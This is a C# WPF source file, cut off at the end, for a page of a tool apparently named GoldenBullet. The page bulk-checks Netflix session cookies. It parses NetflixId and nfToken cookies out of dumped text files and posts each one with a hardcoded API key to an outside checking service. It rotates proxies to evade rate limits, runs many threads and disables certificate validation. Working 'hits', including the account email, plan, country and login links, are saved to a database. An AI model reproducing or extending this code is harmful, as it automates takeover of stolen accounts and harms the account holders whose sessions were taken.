using Core;
using Core.Entities;
using GoldenBullet.Services;
using GoldenBullet.Views.Dialogs;
using MahApps.Metro.IconPacks;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Win32;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;

namespace GoldenBullet.Views.Pages
{
    public partial class NFTokenCheckerPage : Page
    {
        // ============= CONFIGURATION =============
        private const string API_KEY = "NFK_dda3ee3932171d33d94067e3";
        private const string API_URL = "https://nftoken.site/v1/api.php";
        private const int REQUEST_TIMEOUT = 20;
        private const int DELAY_BETWEEN_REQUESTS = 0;
        // =========================================

        // Database proxy fields
        private List<ProxyInfo> _databaseProxies = new List<ProxyInfo>();
        private bool _isLoadingProxyGroup = false;

        private readonly ObservableCollection<ResultItem> _results;
        private readonly List<ResultItem> _allResults;
        private readonly object _resultsLock = new object();
        private readonly Random _random = new Random();

        private bool _isRunning;
        private int _totalCount;
        private int _checkedCount;
        private int _validCount;
        private DateTime _startTime;
        private CancellationTokenSource _cancellationTokenSource;

        // Filter state
        private string _currentFilter = "All";

        public NFTokenCheckerPage()
        {
            InitializeComponent();

            _results = new ObservableCollection<ResultItem>();
            _allResults = new List<ResultItem>();
            _isRunning = false;

            ResultsGrid.ItemsSource = _results;
            InitializeUI();

            _ = LoadProxyGroupsAsync();

            Unloaded += NFTokenCheckerPage_Unloaded;
        }

        #region Data Models

        public class ResultItem
        {
            public string Status { get; set; } = string.Empty;
            public string Email { get; set; } = string.Empty;
            public string Plan { get; set; } = string.Empty;
            public string Country { get; set; } = string.Empty;
            public string Renewal { get; set; } = string.Empty;
            public string MemberSince { get; set; } = string.Empty;
            public string LinkPC { get; set; } = "#";
            public string LinkMobile { get; set; } = "#";
            public string LinkTV { get; set; } = "#";
            public string Error { get; set; } = string.Empty;
            public string ProxyUsed { get; set; } = "None";
            public string CookieData { get; set; } = string.Empty; // Store cookie for DB save
            public SolidColorBrush StatusColor { get; set; } =
                new SolidColorBrush(Color.FromRgb(255, 179, 0));
        }

        public class ProxyInfo
        {
            public string Raw { get; set; }
            public string Host { get; set; }
            public int Port { get; set; }
            public string Username { get; set; }
            public string Password { get; set; }
        }

        #endregion

        #region Proxy Group Loading (Database)

        private async Task LoadProxyGroupsAsync()
        {
            try
            {
                var scopeFactory = SP.GetService<IServiceScopeFactory>();
                using var scope = scopeFactory.CreateScope();
                var dbContext = scope.ServiceProvider.GetService<ApplicationDbContext>();
                var groups = await dbContext.ProxyGroups.AsNoTracking().OrderBy(g => g.Name).ToListAsync();

                Dispatcher.Invoke(() =>
                {
                    ProxyGroupCombo.Items.Clear();
                    ProxyGroupCombo.Items.Add(new ComboBoxItem
                    {
                        Content = "-- Select group --",
                        Tag = null,
                        IsSelected = true
                    });
                    ProxyGroupCombo.Items.Add(new ComboBoxItem
                    {
                        Content = "All",
                        Tag = "ALL",
                        Foreground = (SolidColorBrush)FindResource("TextMutedBrush")
                    });
                    foreach (var group in groups)
                    {
                        ProxyGroupCombo.Items.Add(new ComboBoxItem
                        {
                            Content = group.Name,
                            Tag = group
                        });
                    }
                });
            }
            catch (Exception ex)
            {
                LogMessage($"Error loading proxy groups: {ex.Message}");
            }
        }

        private void ProxyGroupCombo_DropDownOpened(object sender, EventArgs e) => LoadProxyGroups();

        private async void LoadProxyGroups()
        {
            try
            {
                var scopeFactory = SP.GetService<IServiceScopeFactory>();
                using var scope = scopeFactory.CreateScope();
                var dbContext = scope.ServiceProvider.GetService<ApplicationDbContext>();
                var groups = await dbContext.ProxyGroups.AsNoTracking().OrderBy(g => g.Name).ToListAsync();

                Dispatcher.Invoke(() =>
                {
                    var previouslySelected = ProxyGroupCombo.SelectedItem as ComboBoxItem;
                    ProxyGroupCombo.Items.Clear();
                    ProxyGroupCombo.Items.Add(new ComboBoxItem
                    {
                        Content = "-- Select group --",
                        Tag = null,
                        IsSelected = previouslySelected?.Tag == null
                    });
                    ProxyGroupCombo.Items.Add(new ComboBoxItem
                    {
                        Content = "All",
                        Tag = "ALL",
                        Foreground = (SolidColorBrush)FindResource("TextMutedBrush")
                    });
                    foreach (var group in groups)
                    {
                        var item = new ComboBoxItem { Content = group.Name, Tag = group };
                        if (previouslySelected?.Tag is ProxyGroupEntity saved && saved.Id == group.Id)
                            item.IsSelected = true;
                        ProxyGroupCombo.Items.Add(item);
                    }
                });
            }
            catch (Exception ex)
            {
                LogMessage($"Error loading proxy groups: {ex.Message}");
            }
        }

        private async void ProxyGroupCombo_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (_isLoadingProxyGroup || ProxyGroupCombo.SelectedItem is not ComboBoxItem item) return;

            if (item.Tag?.ToString() == "ALL")
            {
                await LoadAllGroupsProxies();
                return;
            }

            if (item.Tag == null)
            {
                _databaseProxies.Clear();
                UpdateProxyCountLabel(0);
                return;
            }

            if (item.Tag is ProxyGroupEntity group)
            {
                await LoadSingleGroupProxies(group);
            }
        }

        private async Task LoadAllGroupsProxies()
        {
            try
            {
                var scopeFactory = SP.GetService<IServiceScopeFactory>();
                using var scope = scopeFactory.CreateScope();
                var dbContext = scope.ServiceProvider.GetService<ApplicationDbContext>();
                var allGroups = await dbContext.ProxyGroups
                    .AsNoTracking()
                    .Include(g => g.Proxies)
                    .ToListAsync();

                var proxies = new List<ProxyInfo>();
                foreach (var group in allGroups)
                {
                    if (group.Proxies?.Any() == true)
                    {
                        foreach (var proxy in group.Proxies)
                        {
                            var proxyStr = $"{proxy.Host}:{proxy.Port}";
                            if (!string.IsNullOrEmpty(proxy.Username))
                                proxyStr += $":{proxy.Username}:{proxy.Password}";
                            proxies.Add(new ProxyInfo
                            {
                                Raw = proxyStr,
                                Host = proxy.Host,
                                Port = proxy.Port,
                                Username = proxy.Username,
                                Password = proxy.Password
                            });
                        }
                    }
                }

                Dispatcher.Invoke(() =>
                {
                    _databaseProxies = proxies;
                    UpdateProxyCountLabel(proxies.Count);
                });
                LogMessage($"Loaded {proxies.Count} proxies from ALL groups");
            }
            catch (Exception ex)
            {
                LogMessage($"Error loading all proxy groups: {ex.Message}");
            }
        }

        private async Task LoadSingleGroupProxies(ProxyGroupEntity group)
        {
            try
            {
                var scopeFactory = SP.GetService<IServiceScopeFactory>();
                using var scope = scopeFactory.CreateScope();
                var dbContext = scope.ServiceProvider.GetService<ApplicationDbContext>();
                var loadedGroup = await dbContext.ProxyGroups
                    .AsNoTracking()
                    .Include(g => g.Proxies)
                    .FirstOrDefaultAsync(g => g.Id == group.Id);

                if (loadedGroup?.Proxies?.Any() == true)
                {
                    var proxies = new List<ProxyInfo>();
                    foreach (var proxy in loadedGroup.Proxies)
                    {
                        var proxyStr = $"{proxy.Host}:{proxy.Port}";
                        if (!string.IsNullOrEmpty(proxy.Username))
                            proxyStr += $":{proxy.Username}:{proxy.Password}";
                        proxies.Add(new ProxyInfo
                        {
                            Raw = proxyStr,
                            Host = proxy.Host,
                            Port = proxy.Port,
                            Username = proxy.Username,
                            Password = proxy.Password
                        });
                    }
                    Dispatcher.Invoke(() =>
                    {
                        _databaseProxies = proxies;
                        UpdateProxyCountLabel(proxies.Count);
                    });
                    LogMessage($"Loaded {proxies.Count} proxies from '{loadedGroup.Name}'");
                }
                else
                {
                    Dispatcher.Invoke(() =>
                    {
                        _databaseProxies.Clear();
                        UpdateProxyCountLabel(0);
                    });
                    LogMessage($"Group '{loadedGroup?.Name ?? group.Name}' has no proxies");
                }
            }
            catch (Exception ex)
            {
                LogMessage($"Error loading proxy group: {ex.Message}");
            }
        }

        private void UpdateProxyCountLabel(int count)
        {
            Dispatcher.Invoke(() =>
            {
                if (ProxyCountLabel != null)
                    ProxyCountLabel.Text = count.ToString();
            });
        }

        #endregion

        #region UI Initialization

        private void InitializeUI()
        {
            UpdateStatsLabels();

            if (InputTypeCombo != null && InputTypeCombo.SelectedItem == null)
                InputTypeCombo.SelectedIndex = 0;

            if (ThreadsNumericUpDown != null && ThreadsNumericUpDown.Value == 0)
                ThreadsNumericUpDown.Value = 100;

            if (FilterCombo != null)
            {
                FilterCombo.SelectionChanged += FilterCombo_SelectionChanged;
            }

            UpdateStartStopButtonState(isRunning: false);
        }

        #endregion

        #region Filter Logic

        private void FilterCombo_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (FilterCombo?.SelectedItem is not ComboBoxItem item) return;

            _currentFilter = item.Content?.ToString() ?? "All";
            ApplyFilter();
        }

        private void ApplyFilter()
        {
            Dispatcher.Invoke(() =>
            {
                lock (_resultsLock)
                {
                    _results.Clear();

                    IEnumerable<ResultItem> filtered = _allResults;

                    switch (_currentFilter)
                    {
                        case "Valid Only":
                            filtered = _allResults.Where(r => r.Status == "✅ VALID");
                            break;
                        case "Invalid Only":
                            filtered = _allResults.Where(r => r.Status == "❌ INVALID");
                            break;
                        default:
                            filtered = _allResults;
                            break;
                    }

                    foreach (var item in filtered)
                    {
                        _results.Add(item);
                    }
                }
            });
        }

        #endregion

        #region Cookie Parser

        private class CookieParser
        {
            public static List<string> ParseMixedInput(string text)
            {
                var extracted = new List<string>();
                if (string.IsNullOrWhiteSpace(text)) return extracted;

                var workingText = text;
                var startIndex = 0;
                while (true)
                {
                    startIndex = workingText.IndexOf('[', startIndex);
                    if (startIndex == -1) break;

                    var endIndex = startIndex;
                    var foundValid = false;

                    while (true)
                    {
                        endIndex = workingText.IndexOf(']', endIndex + 1);
                        if (endIndex == -1) break;

                        var potentialJson = workingText.Substring(startIndex,
                            endIndex - startIndex + 1);
                        try
                        {
                            var parsed = JsonSerializer.Deserialize<List<object>>(potentialJson);
                            if (parsed != null)
                            {
                                extracted.Add(potentialJson.Trim());
                                workingText = workingText.Substring(0, startIndex) +
                                       new string(' ', potentialJson.Length) +
                                       workingText.Substring(endIndex + 1);
                                foundValid = true;
                                break;
                            }
                        }
                        catch { }
                    }

                    if (!foundValid) startIndex++;
                }

                workingText = workingText.Replace('|', '\n');
                var lines = workingText.Split(new[] { '\r', '\n' },
                    StringSplitOptions.RemoveEmptyEntries);
                var currentNetscape = new List<string>();
                var seenKeys = new HashSet<string>();

                foreach (var line in lines)
                {
                    var trimmed = line.Trim();
                    if (string.IsNullOrEmpty(trimmed) || trimmed == ";")
                    {
                        if (currentNetscape.Count > 0)
                        {
                            extracted.Add(string.Join("\n", currentNetscape));
                            currentNetscape.Clear();
                            seenKeys.Clear();
                        }
                        continue;
                    }

                    if (trimmed.EndsWith(";"))
                        trimmed = trimmed.Substring(0, trimmed.Length - 1).Trim();

                    if (trimmed.Contains(".netflix.com") &&
                        (trimmed.Contains("TRUE") || trimmed.Contains("FALSE")))
                    {
                        var parts = trimmed.Split(new[] { ' ', '\t' },
                            StringSplitOptions.RemoveEmptyEntries);
                        if (parts.Length >= 6)
                        {
                            var keyName = parts[5];
                            if (seenKeys.Contains(keyName))
                            {
                                if (currentNetscape.Count > 0)
                                {
                                    extracted.Add(string.Join("\n", currentNetscape));
                                    currentNetscape.Clear();
                                    seenKeys.Clear();
                                }
                            }
                            seenKeys.Add(keyName);
                        }
                        currentNetscape.Add(trimmed);
                    }
                    else if (trimmed.Contains("NetflixId=") ||
                             trimmed.Contains("SecureNetflixId=") ||
                             trimmed.Contains("nfToken="))
                    {
                        if (currentNetscape.Count > 0)
                        {
                            extracted.Add(string.Join("\n", currentNetscape));
                            currentNetscape.Clear();
                            seenKeys.Clear();
                        }
                        extracted.Add(trimmed);
                    }
                }

                if (currentNetscape.Count > 0)
                    extracted.Add(string.Join("\n", currentNetscape));

                var uniqueCookies = new HashSet<string>(extracted);
                return new List<string>(uniqueCookies);
            }
        }

        #endregion

        #region API Call with Proxy

        private async Task<(int statusCode, string responseJson, string proxyUsed, bool isRetryableError)> CallApiAsync(string cookie, ProxyInfo proxy)
        {
            var handler = new HttpClientHandler
            {
                ServerCertificateCustomValidationCallback = (message, cert, chain, errors) => true,
                AutomaticDecompression = System.Net.DecompressionMethods.GZip |
                                         System.Net.DecompressionMethods.Deflate
            };

            if (proxy != null)
            {
                try
                {
                    var proxyUri = new Uri($"http://{proxy.Host}:{proxy.Port}");
                    var webProxy = new WebProxy(proxyUri);
                    if (!string.IsNullOrEmpty(proxy.Username))
                    {
                        webProxy.Credentials = new NetworkCredential(proxy.Username, proxy.Password ?? string.Empty);
                    }
                    handler.Proxy = webProxy;
                    handler.UseProxy = true;
                }
                catch
                {
                    handler.UseProxy = false;
                }
            }

            using var httpClient = new HttpClient(handler)
            {
                Timeout = TimeSpan.FromSeconds(REQUEST_TIMEOUT)
            };

            httpClient.DefaultRequestHeaders.Add("User-Agent",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            httpClient.DefaultRequestHeaders.Add("Accept", "application/json");

            try
            {
                var payload = $"{{\"key\":\"{API_KEY}\",\"cookie\":{JsonSerializer.Serialize(cookie)}}}";
                var content = new StringContent(payload, Encoding.UTF8, "application/json");

                var response = await httpClient.PostAsync(API_URL, content, _cancellationTokenSource.Token);
                var responseJson = await response.Content.ReadAsStringAsync();

                // Rate limited (429) is retryable - try another proxy
                if ((int)response.StatusCode == 429)
                {
                    return (429, responseJson, proxy?.Raw ?? "None", true);
                }

                return ((int)response.StatusCode, responseJson, proxy?.Raw ?? "None", false);
            }
            catch (HttpRequestException)
            {
                return (0, string.Empty, proxy?.Raw ?? "None", true);
            }
            catch (TaskCanceledException)
            {
                return (0, string.Empty, proxy?.Raw ?? "None", true);
            }
            catch
            {
                return (0, string.Empty, proxy?.Raw ?? "None", true);
            }
        }

        #endregion

        #region UI Helpers

        private void UpdateProgress(int current, int total)
        {
            Dispatcher.Invoke(() =>
            {
                ProgressBar.Maximum = total;
                ProgressBar.Value = current;

                var percent = total > 0 ? (int)(current * 100.0 / total) : 0;
                ProgressLabel.Text = $"{percent}% • {current}/{total}";

                if (MiniProgress != null)
                    MiniProgress.Value = percent;
            });
        }

        private void UpdateStatsLabels()
        {
            Dispatcher.Invoke(() =>
            {
                lock (_resultsLock)
                {
                    var total = _allResults.Count;
                    var valid = _allResults.Count(r => r.Status == "✅ VALID");
                    var invalid = total - valid;
                    var rate = total > 0 ? (int)(valid * 100.0 / total) : 0;

                    if (TotalCountLabel != null) TotalCountLabel.Text = _totalCount.ToString();
                    if (CheckedCountLabel != null) CheckedCountLabel.Text = _checkedCount.ToString();
                    if (ValidCountLabel != null) ValidCountLabel.Text = valid.ToString();
                    if (InvalidCountLabel != null) InvalidCountLabel.Text = invalid.ToString();
                    if (SuccessRateLabel != null) SuccessRateLabel.Text = $"{rate}% success";
                }
            });
        }

        private void UpdateStatus(string status, string colorKey)
        {
            Dispatcher.Invoke(() =>
            {
                if (StatusLabel != null)
                    StatusLabel.Text = status;

                if (StatusBadge != null)
                {
                    var color = colorKey switch
                    {
                        "warning" => (SolidColorBrush)FindResource("WarningBrush"),
                        "success" => (SolidColorBrush)FindResource("SuccessBrush"),
                        "error" => (SolidColorBrush)FindResource("ErrorBrush"),
                        "info" => (SolidColorBrush)FindResource("InfoBrush"),
                        _ => (SolidColorBrush)FindResource("WarningBrush")
                    };
                    StatusBadge.Background = color;
                }
            });
        }

        private void AddResult(ResultItem result)
        {
            Dispatcher.Invoke(() =>
            {
                lock (_resultsLock)
                {
                    result.StatusColor = result.Status switch
                    {
                        "✅ VALID" => new SolidColorBrush(Color.FromRgb(0, 200, 83)),
                        "❌ INVALID" => new SolidColorBrush(Color.FromRgb(255, 82, 82)),
                        _ => new SolidColorBrush(Color.FromRgb(176, 176, 176))
                    };

                    _allResults.Add(result);

                    bool shouldShow = _currentFilter switch
                    {
                        "Valid Only" => result.Status == "✅ VALID",
                        "Invalid Only" => result.Status == "❌ INVALID",
                        _ => true
                    };

                    if (shouldShow)
                    {
                        _results.Add(result);
                    }

                    _checkedCount++;
                }

                if (ResultsGrid.Items.Count > 0)
                    ResultsGrid.ScrollIntoView(ResultsGrid.Items[ResultsGrid.Items.Count - 1]);

                UpdateStatsLabels();
            });
        }

        private void OpenLink_Click(object sender, RoutedEventArgs e)
        {
            if (sender is Button btn && btn.Tag is string url &&
                !string.IsNullOrEmpty(url) && url != "#")
            {
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = url,
                        UseShellExecute = true
                    });
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Failed to open: {ex.Message}", "Error",
                        MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
        }

        #endregion

        #region Start/Stop Logic with Mandatory Proxy

        private async void StartStopButton_Click(object sender, RoutedEventArgs e)
        {
            if (_isRunning)
            {
                StopValidation();
                return;
            }

            // Activation check
            if (!FLS.IsActivated())
            {
                await ShowRequiredDialogAsync();
                if (!FLS.IsActivated())
                {
                    LogMessage("⚠️ Activation required to start checker");
                    UpdateStatus("ACTIVATION REQUIRED", "warning");
                    return;
                }
            }

            if (_isRunning) return;

            // PROXY IS MANDATORY - Check if proxies are selected
            if (_databaseProxies.Count == 0)
            {
                MessageBox.Show("Please select a proxy group first! Proxy is required to run checks.",
                    "Proxy Required", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            var path = InputPathTextBox.Text;
            if (string.IsNullOrEmpty(path))
            {
                MessageBox.Show("Please browse and select a file or folder first", "Input Required",
                    MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            var inputType = InputTypeCombo?.SelectedItem is ComboBoxItem item
                ? item.Tag?.ToString()
                : "File";

            List<string> cookieItems = null;
            string sourceLabel = string.Empty;

            try
            {
                if (inputType == "Folder" && Directory.Exists(path))
                {
                    var allCookies = new List<string>();
                    var files = Directory.GetFiles(path, "*.txt", SearchOption.AllDirectories);

                    foreach (var file in files)
                    {
                        var content = File.ReadAllText(file, Encoding.UTF8);
                        var cookies = CookieParser.ParseMixedInput(content);
                        allCookies.AddRange(cookies);
                    }

                    if (allCookies.Count == 0)
                    {
                        MessageBox.Show("No valid cookies found in folder", "Warning",
                            MessageBoxButton.OK, MessageBoxImage.Warning);
                        return;
                    }

                    cookieItems = allCookies;
                    sourceLabel = $"{files.Length} file(s)";
                }
                else if (File.Exists(path))
                {
                    var content = File.ReadAllText(path, Encoding.UTF8);
                    cookieItems = CookieParser.ParseMixedInput(content);

                    if (cookieItems == null || cookieItems.Count == 0)
                    {
                        MessageBox.Show("No valid cookies found in file", "Warning",
                            MessageBoxButton.OK, MessageBoxImage.Warning);
                        return;
                    }

                    sourceLabel = Path.GetFileName(path);
                }
                else
                {
                    MessageBox.Show("Invalid path selected", "Error",
                        MessageBoxButton.OK, MessageBoxImage.Error);
                    return;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error loading input: {ex.Message}", "Error",
                    MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            LogMessage($"Using {_databaseProxies.Count} proxies from database");
            LogMessage($"🚀 Starting validation: {cookieItems.Count} cookie(s) from {sourceLabel}");

            _cancellationTokenSource = new CancellationTokenSource();
            _results.Clear();
            _allResults.Clear();
            _totalCount = cookieItems.Count;
            _checkedCount = 0;
            _validCount = 0;
            _isRunning = true;
            _startTime = DateTime.Now;

            UpdateStartStopButtonState(isRunning: true);
            UpdateStatus("RUNNING", "info");
            ProgressBar.Value = 0;
            ProgressLabel.Text = "Initializing...";

            _ = ProcessCookiesAsync(cookieItems);
        }

        private async Task ShowRequiredDialogAsync()
        {
            var mainWindow = Application.Current.MainWindow as MainWindow;
            await Application.Current.Dispatcher.InvokeAsync(() =>
            {
                var activationPage = new RequiredDialog();
                var dialog = new MainDialog(activationPage, "Activation Required", 500, 600);
                dialog.Owner = Window.GetWindow(this);
                dialog.WindowStartupLocation = WindowStartupLocation.CenterOwner;
                dialog.ShowDialog();
            });
            if (FLS.IsActivated() && mainWindow != null)
            {
                await mainWindow.Dispatcher.InvokeAsync(() =>
                {
                    mainWindow.CheckLicense();
                    mainWindow.ForceRefresh();
                });
            }
        }

        private void StopValidation()
        {
            _isRunning = false;

            if (_cancellationTokenSource != null)
            {
                try { _cancellationTokenSource.Cancel(); }
                catch (ObjectDisposedException) { }
                _cancellationTokenSource.Dispose();
                _cancellationTokenSource = null;
            }

            UpdateStartStopButtonState(isRunning: false);
            UpdateStatus("STOPPED", "warning");
            LogMessage("⚠️ Validation stopped by user");
        }

        private void UpdateStartStopButtonState(bool isRunning)
        {
            Dispatcher.Invoke(() =>
            {
                if (isRunning)
                {
                    if (FindResource("StyledDangerButton") is Style dangerStyle)
                        StartStopButton.Style = dangerStyle;
                    StartStopButton.ToolTip = "Stop Validation";
                    if (StartStopIcon != null)
                        StartStopIcon.Kind = PackIconMaterialKind.Stop;
                }
                else
                {
                    if (FindResource("StyledSuccessButton") is Style successStyle)
                        StartStopButton.Style = successStyle;
                    StartStopButton.ToolTip = "Start Validation";
                    if (StartStopIcon != null)
                        StartStopIcon.Kind = PackIconMaterialKind.Play;
                }
            });
        }

        #endregion

        #region File Operations

        private void BrowseInput_Click(object sender, RoutedEventArgs e)
        {
            var inputType = InputTypeCombo?.SelectedItem is ComboBoxItem item
                ? item.Tag?.ToString()
                : "File";

            if (inputType == "Folder")
            {
                using var dialog = new System.Windows.Forms.FolderBrowserDialog
                {
                    Description = "Select folder containing cookie files",
                    ShowNewFolderButton = false
                };

                if (dialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    InputPathTextBox.Text = dialog.SelectedPath;
                    LoadFromFolder(dialog.SelectedPath);
                }
            }
            else
            {
                var dialog = new OpenFileDialog
                {
                    Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*",
                    Title = "Select cookie file"
                };
                if (dialog.ShowDialog() == true)
                {
                    InputPathTextBox.Text = dialog.FileName;
                    LoadFromFile(dialog.FileName);
                }
            }
        }

        private void LoadFromFile(string path)
        {
            if (string.IsNullOrEmpty(path) || !File.Exists(path))
            {
                MessageBox.Show("Please select a valid file first", "Error",
                    MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            try
            {
                var content = File.ReadAllText(path, Encoding.UTF8);
                var cookieList = CookieParser.ParseMixedInput(content);

                if (cookieList.Count == 0)
                {
                    MessageBox.Show("No valid cookies found in file", "Warning",
                        MessageBoxButton.OK, MessageBoxImage.Warning);
                    return;
                }

                TotalCountLabel.Text = cookieList.Count.ToString();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error loading file: {ex.Message}", "Error",
                    MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private void LoadFromFolder(string path)
        {
            if (string.IsNullOrEmpty(path) || !Directory.Exists(path))
            {
                MessageBox.Show("Please select a valid folder first", "Error",
                    MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            try
            {
                var allCookies = new List<string>();
                var files = Directory.GetFiles(path, "*.txt", SearchOption.AllDirectories);

                foreach (var file in files)
                {
                    var content = File.ReadAllText(file, Encoding.UTF8);
                    var cookies = CookieParser.ParseMixedInput(content);
                    allCookies.AddRange(cookies);
                }

                if (allCookies.Count == 0)
                {
                    MessageBox.Show("No valid cookies found in folder", "Warning",
                        MessageBoxButton.OK, MessageBoxImage.Warning);
                    return;
                }

                TotalCountLabel.Text = allCookies.Count.ToString();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error loading folder: {ex.Message}", "Error",
                    MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private void InputTypeCombo_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            var item = InputTypeCombo?.SelectedItem as ComboBoxItem;
            if (item?.Tag?.ToString() == "Folder")
            {
                InputPathTextBox.Text = "Click Browse to select folder...";
            }
            else
            {
                InputPathTextBox.Text = "Click Browse to select file...";
            }
        }

        #endregion

        #region Validation Processing - Retry on Rate Limit & Save Hits

        private async Task ProcessCookiesAsync(List<string> cookieItems)
        {
            var semaphore = new SemaphoreSlim((int)ThreadsNumericUpDown.Value);
            var tasks = new List<Task>();

            for (int i = 0; i < cookieItems.Count && _isRunning; i++)
            {
                var idx = i + 1;
                var cookie = cookieItems[i];

                await semaphore.WaitAsync(_cancellationTokenSource.Token);

                var task = Task.Run(async () =>
                {
                    try
                    {
                        await ValidateCookieWithRetry(cookie, idx, cookieItems.Count);
                    }
                    finally
                    {
                        semaphore.Release();
                    }
                }, _cancellationTokenSource.Token);

                tasks.Add(task);
            }

            await Task.WhenAll(tasks);
            OnValidationComplete();
        }

        /// <summary>
        /// Keep retrying with different proxies until we get VALID or INVALID.
        /// Rate-limited (429), connection errors, timeouts = retry with another proxy.
        /// Only VALID or INVALID are final states.
        /// </summary>
        private async Task ValidateCookieWithRetry(string cookie, int index, int total)
        {
            var maxAttempts = Math.Max(_databaseProxies.Count * 3, 10);
            var attempt = 0;
            var lastError = string.Empty;

            while (attempt < maxAttempts && _isRunning)
            {
                ProxyInfo proxy = null;
                lock (_resultsLock)
                {
                    proxy = _databaseProxies[_random.Next(_databaseProxies.Count)];
                }

                var (httpCode, responseJson, proxyUsed, isRetryableError) = await CallApiAsync(cookie, proxy);

                if (!_isRunning) return;

                // Retryable errors: connection issues, timeouts, rate-limited (429)
                if (isRetryableError)
                {
                    lastError = httpCode == 429 ? $"Rate limited on {proxyUsed}" : $"Proxy error: {proxyUsed}";
                    attempt++;
                    continue; // Try again with different proxy - NO penalty
                }

                // We got a response - this counts as checked
                var result = new ResultItem();
                result.ProxyUsed = proxyUsed;
                result.CookieData = cookie; // Store cookie for DB save

                try
                {
                    using var doc = JsonDocument.Parse(responseJson);
                    var root = doc.RootElement;

                    if (root.TryGetProperty("status", out var statusProp))
                    {
                        var status = statusProp.GetString();

                        if (status == "SUCCESS")
                        {
                            result.Status = "✅ VALID";
                            result.Email = GetProp(root, "x_mail");
                            result.Plan = GetProp(root, "x_tier");
                            result.Country = GetProp(root, "x_loc");
                            result.Renewal = GetProp(root, "x_ren");
                            result.MemberSince = GetProp(root, "x_mem");
                            result.LinkPC = GetProp(root, "x_l1");
                            result.LinkMobile = GetProp(root, "x_l2");
                            result.LinkTV = GetProp(root, "x_l3");
                            _validCount++;

                            // Save hit to database (like NetflixCookiePage)
                            await SaveHitToDatabase(result);
                        }
                        else if (status == "ERROR")
                        {
                            // API returned ERROR = INVALID (definitive result)
                            result.Status = "❌ INVALID";
                            result.Error = GetProp(root, "message");
                        }
                        else
                        {
                            result.Status = "❌ INVALID";
                            result.Error = $"Unknown status: {status}";
                        }
                    }
                    else
                    {
                        result.Status = "❌ INVALID";
                        result.Error = "No status field in response";
                    }
                }
                catch (JsonException)
                {
                    result.Status = "❌ INVALID";
                    result.Error = "Invalid JSON response";
                }
                catch (Exception ex)
                {
                    result.Status = "❌ INVALID";
                    result.Error = ex.Message;
                }

                UpdateProgress(index, total);
                AddResult(result);
                return; // Done - definitive result (VALID or INVALID)
            }

            // Max retries exceeded - mark as INVALID
            if (_isRunning)
            {
                var failResult = new ResultItem
                {
                    Status = "❌ INVALID",
                    Error = $"Max proxy retries exceeded ({maxAttempts}). Last: {lastError}",
                    ProxyUsed = "Multiple"
                };
                UpdateProgress(index, total);
                AddResult(failResult);
            }
        }

        /// <summary>
        /// Save valid hit to database - single line capture format
        /// </summary>
        private async Task SaveHitToDatabase(ResultItem result)
        {
            try
            {
                var vmService = SP.GetService<ViewModelsService>();
                var hitsVM = vmService.Hits;

                // Single line captured data format (like NetflixCookiePage)
                var capturedData = $"Email: {result.Email} | Plan: {result.Plan} | Country: {result.Country} | Renewal: {result.Renewal} | MemberSince: {result.MemberSince} | Links: PC={result.LinkPC}, Mobile={result.LinkMobile}, TV={result.LinkTV} | ConfigBy: Core";

                var hit = new HitEntity
                {
                    Data = result.CookieData,
                    Type = "SUCCESS",
                    ConfigName = "NFTokenChecker",
                    Date = DateTime.Now,
                    WordlistName = "NFTokenChecker",
                    Proxy = result.ProxyUsed ?? "None",
                    CapturedData = capturedData
                };

                await hitsVM.AddHitAsync(hit);
                LogMessage($"💾 Saved hit to database: {result.Email}");
            }
            catch (Exception ex)
            {
                LogMessage($"Failed to save hit to database: {ex.Message}");
            }
        }

        private void OnValidationComplete()
        {
            _isRunning = false;

            if (_cancellationTokenSource != null)
            {
                try { _cancellationTokenSource.Cancel(); }
                catch (ObjectDisposedException) { }
                _cancellationTokenSource.Dispose();
                _cancellationTokenSource = null;
            }

            var elapsed = DateTime.Now - _startTime;
            UpdateStartStopButtonState(isRunning: false);
            UpdateStatus("READY", "success");

            lock (_resultsLock)
            {
                var total = _allResults.Count;
                var valid = _allResults.Count(r => r.Status == "✅ VALID");
                var rate = total > 0 ? (int)(valid * 100.0 / total) : 0;
                LogMessage($"✓ Completed in {elapsed:mm\\:ss} | {valid} valid | {rate}% success");
            }
        }

        private string GetProp(JsonElement data, string name)
        {
            if (data.TryGetProperty(name, out var prop))
            {
                if (prop.ValueKind == JsonValueKind.String)
                    return prop.GetString() ?? "N/A";
                else if (prop.ValueKind == JsonValueKind.Number)
                    return prop.GetDouble().ToString();
                else if (prop.ValueKind == JsonValueKind.True)
                    return "True";
                else if (prop.ValueKind == JsonValueKind.False)
                    return "False";
            }
            return "N/A";
        }

        private void LogMessage(string message)
        {
            Debug.WriteLine($"[NFTokenChecker] {message}");
        }

        #endregion

        #region Utility Methods - Clear All (Full Reset)

        private void ClearAll_Click(object sender, RoutedEventArgs e)
        {
            // Stop if running
            if (_isRunning)
            {
                StopValidation();
            }

            // Clear all collections
            _results.Clear();
            _allResults.Clear();

            // Reset stats
            _totalCount = 0;
            _checkedCount = 0;
            _validCount = 0;

            // Reset UI elements
            Dispatcher.Invoke(() =>
            {
                // Progress
                ProgressBar.Value = 0;
                ProgressLabel.Text = "Ready to start";
                if (MiniProgress != null) MiniProgress.Value = 0;

                // Stats labels
